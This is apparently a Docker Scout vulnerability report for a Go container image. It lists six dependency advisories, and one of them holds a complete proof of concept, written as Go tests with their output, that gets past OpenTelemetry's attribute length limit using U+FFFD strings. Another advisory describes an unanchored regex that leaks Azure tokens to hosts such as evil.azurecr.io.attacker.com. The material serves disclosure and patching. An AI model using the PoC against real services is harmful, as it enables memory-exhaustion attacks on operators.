---
hide_table_of_contents: true
---

<table>
<tr><td>digest</td><td><code>sha256:ccefbb2b13c84e76449878348d447cc06432f5d6ddfe0eac20b9e79805c8b477</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/high-1-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/medium-3-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/low-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/unspecified-2-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>19 MB</td></tr>
<tr><td>packages</td><td>175</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/docker/cli</strong> <code>29.7.2+incompatible</code> (golang)</summary>

<small><code>pkg:golang/github.com/docker/cli@29.7.2%2Bincompatible</code></small><br/>

```dockerfile
# tw-init.Dockerfile (22:22)
COPY --from=build /app/testworkflow-init /init
```

<br/>

<a href="https://scout.docker.com/v/CVE-2025-15558?s=golang&n=cli&ns=github.com%2Fdocker&t=golang&vr=%3E%3D19.03.0%2Bincompatible"><img alt="high : CVE--2025--15558" src="https://img.shields.io/badge/CVE--2025--15558-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=19.03.0+incompatible</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.549%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Docker CLI Plugins: Uncontrolled Search Path Element Leads to Local Privilege Escalation on Windows in github.com/docker/cli

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel/trace</strong> <code>1.46.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel/trace@1.46.0</code></small><br/>

```dockerfile
# tw-init.Dockerfile (22:22)
COPY --from=build /app/testworkflow-init /init
```

<br/>

<a href="https://scout.docker.com/v/CVE-2026-128085?s=github&n=trace&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.35.0%2C%3C1.47.0"><img alt="medium 5.3: CVE--2026--128085" src="https://img.shields.io/badge/CVE--2026--128085-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Incorrect Calculation of Multi-Byte String Length</i>

<table>
<tr><td>Affected range</td><td><code>>=1.35.0<br/><1.47.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.47.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.536%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The `AttributeValueLengthLimit` span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit `e016a78c9`, first released in v1.33.0) has an "optimistic" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in `go.opentelemetry.io/otel/sdk/trace` (`sdk/internal/attrnorm`), `go.opentelemetry.io/otel/sdk/log` (`sdk/log/internal/attrnorm`), and the auto-instrumentation tracer in `go.opentelemetry.io/otel/trace` (`trace/auto.go`, introduced in `v1.35.0`).

This is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (>= v1.33.0). The original advisory covers only the pre-v1.33.0 code.

## Details

The shared truncation helper is generated from `internal/shared/attrnorm/truncate.go.tmpl`. In the v1.46.0 release, the generated copies are `sdk/internal/attrnorm/truncate.go` and `sdk/log/internal/attrnorm/truncate.go` (identical logic, different package names). The optimistic path (v1.46.0, `sdk/internal/attrnorm/truncate.go:175-199`) is:

```go
// Optimistically, assume all valid UTF-8.
var b strings.Builder
count := 0
for i, c := range s {
    if c != utf8.RuneError {
        count++
        if count > limit {
            return s[:i]
        }
        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}
```

`range` over a string yields `utf8.RuneError` both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

1. A value made only of valid U+FFFD runes never increments `count`, so no truncation ever triggers and the value is returned unchanged, whatever its length.
2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final `return s[:i]` keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by `limit`.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

- trace: `span.SetAttributes` -> `sdk/trace/span.go` (`normAttr`) -> `attrnorm.Truncate` -> `sdk/internal/attrnorm/truncate.go` (`truncate`)
- log: `Record.AddAttributes` / `SetAttributes` -> `sdk/log/record.go` (`attrnorm.TruncateValue`) -> `sdk/log/internal/attrnorm/truncate.go` (`truncate`)

Deduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (`safeTruncateValidUTF8`), which gave up truncating entirely for strings containing RuneError. The rewrite in `e016a78c9` replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.

## PoC

Minimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares `go 1.25.0`; any recent toolchain auto-selects one).

Create a directory with these files.

`go.mod` (then run `go mod tidy` once to fill `go.sum`):

```
module otelpoc

go 1.25.0

require (
	go.opentelemetry.io/otel v1.46.0
	go.opentelemetry.io/otel/log v0.22.0
	go.opentelemetry.io/otel/sdk v1.46.0
	go.opentelemetry.io/otel/sdk/log v0.22.0
	go.opentelemetry.io/otel/trace v1.46.0
)
```

`otelgo_truncate_test.go`:

```go
package otelpoc

import (
	"context"
	"strings"
	"testing"
	"unicode/utf8"

	"go.opentelemetry.io/otel/attribute"
	sdktrace "go.opentelemetry.io/otel/sdk/trace"
	"go.opentelemetry.io/otel/sdk/trace/tracetest"
	"go.opentelemetry.io/otel/trace"
)

// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and
// everything else unlimited, isolating the length-limit enforcement under test.
func limitsWithLen(limit int) sdktrace.SpanLimits {
	lim := sdktrace.NewSpanLimits()
	lim.AttributeValueLengthLimit = limit
	lim.AttributeCountLimit = -1
	lim.AttributePerEventCountLimit = -1
	lim.AttributePerLinkCountLimit = -1
	lim.EventCountLimit = -1
	lim.LinkCountLimit = -1
	return lim
}

func captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {
	t.Helper()
	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(
		sdktrace.WithSpanProcessor(sr),
		sdktrace.WithSpanLimits(limitsWithLen(limit)),
	)
	defer func() { _ = tp.Shutdown(context.Background()) }()

	tr := tp.Tracer("poc")
	_, span := tr.Start(context.Background(), "op")
	span.SetAttributes(attrs...)
	span.End()

	ended := sr.Ended()
	if len(ended) != 1 {
		t.Fatalf("expected 1 ended span, got %d", len(ended))
	}
	return ended[0].Attributes()
}

// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string
// attribute composed of valid U+FFFD runes is stored completely untruncated
// although AttributeValueLengthLimit=5.
func TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {
	const limit = 5
	val := strings.Repeat("\uFFFD", 1000) // 1000 chars, 3000 bytes

	got := captureOneSpan(t, limit, attribute.String("k", val))
	if len(got) != 1 {
		t.Fatalf("expected 1 attribute, got %d", len(got))
	}
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	// Per OTel spec ("counting any character in it as 1") the stored value
	// must be at most `limit` characters (<= 15 bytes for U+FFFD).
	if maxBytes := 3 * limit; len(stored) > maxBytes {
		t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
			limit, len(stored), maxBytes)
	}
}

// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes
// are not counted in the optimistic truncation path: every U+FFFD adds 3
// uncounted bytes to the retained value.
func TestOT001_FFFDMixedStringOverRetains(t *testing.T) {
	const limit = 5
	val := strings.Repeat("\uFFFD", 100) + strings.Repeat("A", 6) // 106 chars, 306 bytes

	got := captureOneSpan(t, limit, attribute.String("k", val))
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	if chars := utf8.RuneCountInString(stored); chars > limit {
		t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored",
			limit, chars, len(stored))
	}
}

// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values
// ARE truncated, proving the length limit is active in the same setup.
func TestOT001_ASCIIControl(t *testing.T) {
	const limit = 5
	val := strings.Repeat("B", 20)

	got := captureOneSpan(t, limit, attribute.String("k", val))
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	if len(stored) != limit {
		t.Fatalf("control failed: ASCII value not truncated (stored %d bytes)", len(stored))
	}
}

// TestOT001_EventAttributesNotLengthTruncated documents that span-event
// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate
// call in recordingSpan.addEvent).
func TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {
	const limit = 5
	val := strings.Repeat("C", 100)

	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(
		sdktrace.WithSpanProcessor(sr),
		sdktrace.WithSpanLimits(limitsWithLen(limit)),
	)
	defer func() { _ = tp.Shutdown(context.Background()) }()
	tr := tp.Tracer("poc")
	_, span := tr.Start(context.Background(), "op")
	span.AddEvent("ev", trace.WithAttributes(attribute.String("k", val)))
	span.End()

	ended := sr.Ended()
	events := ended[0].Events()
	if len(events) != 1 {
		t.Fatalf("expected 1 event, got %d", len(events))
	}
	stored := events[0].Attributes[0].Value.AsString()
	t.Logf("event attribute input: %d bytes; stored: %d bytes; limit=%d", len(val), len(stored), limit)
	if len(stored) > limit {
		t.Logf("CONFIRMED: event attribute not length-truncated (%d bytes > limit %d)", len(stored), limit)
	}
}
```

(The `-run` pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)

`otelgo_log_truncate_test.go`:

```go
package otelpoc

import (
	"context"
	"strings"
	"sync"
	"testing"
	"unicode/utf8"

	"go.opentelemetry.io/otel/attribute"
	apisdk "go.opentelemetry.io/otel/log"
	sdklog "go.opentelemetry.io/otel/sdk/log"
)

type captureProcessor struct {
	mu   sync.Mutex
	recs []*sdklog.Record
}

func (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }

func (c *captureProcessor) OnEmit(_ context.Context, r *sdklog.Record) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	clone := r.Clone()
	c.recs = append(c.recs, &clone)
	return nil
}

func (c *captureProcessor) Shutdown(context.Context) error { return nil }
func (c *captureProcessor) ForceFlush(context.Context) error {
	return nil
}

// TestOT001_FFFDOnlyStringBypassesLogLengthLimit repeats the bypass against
// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).
func TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {
	const limit = 5
	cp := &captureProcessor{}
	lp := sdklog.NewLoggerProvider(
		sdklog.WithProcessor(cp),
		sdklog.WithAttributeValueLengthLimit(limit),
	)
	defer func() { _ = lp.Shutdown(context.Background()) }()

	logger := lp.Logger("poc")
	var r apisdk.Record
	r.SetSeverity(apisdk.SeverityInfo)
	r.AddAttributes(attribute.String("k", strings.Repeat("\uFFFD", 1000)))
	logger.Emit(context.Background(), r)

	cp.mu.Lock()
	if len(cp.recs) != 1 {
		t.Fatalf("expected 1 record, got %d", len(cp.recs))
	}
	rec := cp.recs[0]
	cp.mu.Unlock()

	stored := ""
	rec.WalkAttributes(func(kv attribute.KeyValue) bool {
		if string(kv.Key) == "k" {
			stored = kv.Value.AsString()
		}
		return true
	})
	t.Logf("sdk/log input: 1000 chars / 3000 bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(stored), len(stored), limit)
	if maxBytes := 3 * limit; len(stored) > maxBytes {
		t.Fatalf("BYPASS: sdk/log WithAttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
			limit, len(stored), maxBytes)
	}
}
```

Run:

```
go mod tidy
go test -count=1 -v -run "TestOT001_FFFDOnlyStringBypassesTraceLengthLimit|TestOT001_FFFDMixedStringOverRetains|TestOT001_ASCIIControl|TestOT001_FFFDOnlyStringBypassesLogLengthLimit" .
```

Expected output (captured against the published v1.46.0 modules; the three FAIL lines are the bypass being triggered and the PASS control proves the limit is active in the same setup; the only varying parts are the durations in parentheses and the total on the `FAIL	otelpoc` summary line):

```
=== RUN   TestOT001_FFFDOnlyStringBypassesLogLengthLimit
    otelgo_log_truncate_test.go:66: sdk/log input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5
    otelgo_log_truncate_test.go:69: BYPASS: sdk/log WithAttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)
--- FAIL: TestOT001_FFFDOnlyStringBypassesLogLengthLimit (0.00s)
=== RUN   TestOT001_FFFDOnlyStringBypassesTraceLengthLimit
    otelgo_truncate_test.go:61: input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5
    otelgo_truncate_test.go:67: BYPASS: AttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)
--- FAIL: TestOT001_FFFDOnlyStringBypassesTraceLengthLimit (0.00s)
=== RUN   TestOT001_FFFDMixedStringOverRetains
    otelgo_truncate_test.go:81: input: 106 chars / 306 bytes; stored: 105 chars / 305 bytes; limit=5
    otelgo_truncate_test.go:85: BYPASS: AttributeValueLengthLimit=5 but 105 chars / 305 bytes stored
--- FAIL: TestOT001_FFFDMixedStringOverRetains (0.00s)
=== RUN   TestOT001_ASCIIControl
    otelgo_truncate_test.go:98: input: 20 chars / 20 bytes; stored: 5 chars / 5 bytes; limit=5
--- PASS: TestOT001_ASCIIControl (0.00s)
FAIL
FAIL	otelpoc	0.059s
FAIL
```

The mixed-string case stores 105 characters for a limit of 5: the 100 U+FFFD runes (300 uncounted bytes) are all retained, plus 5 of the 6 ASCII characters.

## Impact

Applications that enable `AttributeValueLengthLimit` (or `WithAttributeValueLengthLimit` for logs) to bound attribute memory do not get that bound for values containing valid U+FFFD runes. Span and log-record attribute values are routinely derived from untrusted input (HTTP headers, request bodies, database fields), so an attacker can inflate per-span memory retention linearly, defeating the memory protection the operator explicitly enabled and accumulating increased memory usage over the span/log pipeline. Confidentiality and integrity are not affected.

## Suggested fix

In the optimistic loop, count every rune of size > 1 (including the legitimately encoded U+FFFD) and only divert size-1 invalid bytes to the slow path. Add regression cases for: pure U+FFFD strings, U+FFFD-dominated mixed strings, and a truncation point landing after a U+FFFD (the current `truncate_test.go` has no U+FFFD case).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>stdlib</strong> <code>1.27.3</code> (golang)</summary>

<small><code>pkg:golang/stdlib@1.27.3</code></small><br/>

```dockerfile
# tw-init.Dockerfile (22:22)
COPY --from=build /app/testworkflow-init /init
```

<br/>

<a href="https://scout.docker.com/v/CVE-2026-97054?s=golang&n=stdlib&t=golang&vr=%3E%3D1.27.0-0%2C%3C1.27.4"><img alt="medium : CVE--2026--97054" src="https://img.shields.io/badge/CVE--2026--97054-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.27.0-0<br/><1.27.4</code></td></tr>
<tr><td>Fixed version</td><td><code>1.27.4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.479%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

For HTTP/1 servers, when MaxBytesReader's limit is exceeded, "Connection: close" header is automatically set without synchronization, which might race with another header being set explicitly in the server handler. As a result, an HTTP/1 server that utilizes MaxBytesReader or MaxBytesHandler can crash due to runtime panic if its handler reads the request body concurrently with writing the response header.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel</strong> <code>1.46.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel@1.46.0</code></small><br/>

```dockerfile
# tw-init.Dockerfile (22:22)
COPY --from=build /app/testworkflow-init /init
```

<br/>

<a href="https://scout.docker.com/v/CVE-2026-128086?s=golang&n=otel&ns=go.opentelemetry.io&t=golang&vr=%3E%3D1.0.0-RC1%2C%3C1.47.0"><img alt="medium : CVE--2026--128086" src="https://img.shields.io/badge/CVE--2026--128086-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.0.0-RC1<br/><1.47.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.47.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.437%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Memory allocation amplification in W3C baggage parsing in go.opentelemetry.io/otel

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>golang.org/x/crypto</strong> <code>0.58.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/crypto@0.58.0</code></small><br/>

```dockerfile
# tw-init.Dockerfile (22:22)
COPY --from=build /app/testworkflow-init /init
```

<br/>

<a href="https://scout.docker.com/v/GO-2026-5932?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.58.1-0.20261009181718-2f1f834330b2"><img alt="unspecified : GO--2026--5932" src="https://img.shields.io/badge/GO--2026--5932-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.58.1-0.20261009181718-2f1f834330b2</code></td></tr>
<tr><td>Fixed version</td><td><code>0.58.1-0.20261009181718-2f1f834330b2</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.

If you are required to interoperate with OpenPGP systems and need a maintained package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained fork that aims to be a drop-in replacement for this package.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>github.com/chrismellard/docker-credential-acr-env</strong> <code>0.0.0-20230304212654-82a0ddb27589</code> (golang)</summary>

<small><code>pkg:golang/github.com/chrismellard/docker-credential-acr-env@0.0.0-20230304212654-82a0ddb27589</code></small><br/>

```dockerfile
# tw-init.Dockerfile (22:22)
COPY --from=build /app/testworkflow-init /init
```

<br/>

<a href="https://scout.docker.com/v/GO-2026-6225?s=golang&n=docker-credential-acr-env&ns=github.com%2Fchrismellard&t=golang&vr=%3E%3D0"><img alt="unspecified : GO--2026--6225" src="https://img.shields.io/badge/GO--2026--6225-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In github.com/chrismellard/docker-credential-acr-env/pkg/credhelper, the regular expression used by isACRRegistry to validate Azure Container Registry hostnames is unanchored. As a result, arbitrary hostnames containing the substring ".azurecr.io" (such as evil.azurecr.io.attacker.com) are treated as valid ACR registries, causing ACRCredHelper.Get to send the Azure Active Directory (AAD) access token to attacker-controlled hosts.

</blockquote>
</details>
</details></td></tr>
</table>

